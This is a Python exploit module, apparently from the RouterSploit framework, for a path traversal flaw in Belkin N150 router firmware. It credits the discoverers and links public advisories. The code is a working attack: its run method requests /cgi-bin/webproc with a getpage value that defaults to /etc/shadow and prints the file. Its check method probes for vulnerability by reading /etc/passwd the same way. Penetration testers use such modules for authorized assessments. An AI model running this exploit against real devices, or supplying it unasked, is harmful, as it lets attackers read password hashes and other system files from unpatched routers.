from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Belkin N150 Path Traversal",
        "description": "Module exploits Belkin N150 Path Traversal vulnerability "
                       "which allows to read any file on the system.",
        "authors": (
            "Aditya Lad",  # vulnerability discovery
            "Rahul Pratap Singh",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/38488/",
            "http://www.belkin.com/us/support-article?articleNum=109400",
            "http://www.kb.cert.org/vuls/id/774788",
        ),
        "devices": (
            "Belkin N150 1.00.07",
            "Belkin N150 1.00.08",
            "Belkin N150 1.00.09",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    filename = OptString("/etc/shadow", "File to read from filesystem")

    def run(self):
        if self.check():
            path = "/cgi-bin/webproc?getpage={}&var:page=deviceinfo".format(self.filename)

            response = self.http_request(
                method="GET",
                path=path,
            )
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Success! File: %s" % self.filename)
                print_info(response.text)
            else:
                print_error("Exploit failed")
        else:
            print_error("Device seems to be not vulnerable")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo",
        )

        if response and utils.detect_file_content(response.text, "/etc/passwd"):
            return True  # target vulnerable

        return False  # target is not vulnerable
